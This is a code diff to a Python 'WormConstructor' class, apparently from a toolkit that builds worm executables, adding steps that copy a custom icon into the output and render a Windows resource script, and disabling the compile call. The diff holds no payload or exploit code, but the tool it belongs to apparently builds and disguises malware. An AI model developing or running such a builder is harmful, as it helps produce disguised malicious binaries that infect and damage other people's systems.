@@ -60,6 +60,14 @@ class WormConstructor:
         
         return True
     
+    def _add_icon(self, master_raw: MasterRaw) -> MasterRaw:
+        if master_raw.worm_icon:
+            try:
+                shutil.copy2(master_raw.worm_icon_fpath, os.path.join(master_raw.dir_output, master_raw.worm_icon))
+            except Exception as e:
+                self.msg("error", f"[!!] ERROR Copying icon: {e} [!!]", sender=self.name)
+        return master_raw
+    
     def saveFile(self, fpath: str, data: str) -> bool:
         try:
             with open(fpath, "w") as file:
@@ -93,7 +101,8 @@ class WormConstructor:
         if not self._prepare_dirs(master):
             self.msg("error", "[!!] ABORT BUILDING PROCESS [!!]", sender=self.name)
             return
-        
+        self._add_icon(master)
+
 
 
 
@@ -320,8 +329,9 @@ class WormConstructor:
             self.msg("error", raw_object.last_process_error, sender=self.name)
             return raw_object
         # check for extra step
+        self.build_ResFile(raw_object)
         self._checkExtraStep(raw_object)
-        self.masterCompiler.startCompile(raw_object)
+        # self.masterCompiler.startCompile(raw_object)
         return raw_object
     
     def _checkExtraStep(self, raw_exe: RawExe) -> RawExe:
@@ -330,6 +340,16 @@ class WormConstructor:
             if raw_exe.master_module.fileType == "dll":
                 self._buildDefFile(raw_exe)
         
+        return raw_exe
+    
+    def build_ResFile(self, raw_exe: RawExe) -> RawExe:
+        raw_exe.last_process_name = "Build Resources Script"
+        self.msg("msg", "Builiding RC file....", sender=self.name)
+        if not raw_exe.rcScript:
+            self.msg("msg", "No script to build. Skip step.", sender=self.name)
+            return raw_exe
+        code = self.renderSingleTemplate(raw_exe.rcScript.raw_code, raw_exe.VAR)
+        self.saveFile(raw_exe.raw_compiler.RC_script_fpath, code)
         return raw_exe
     
 
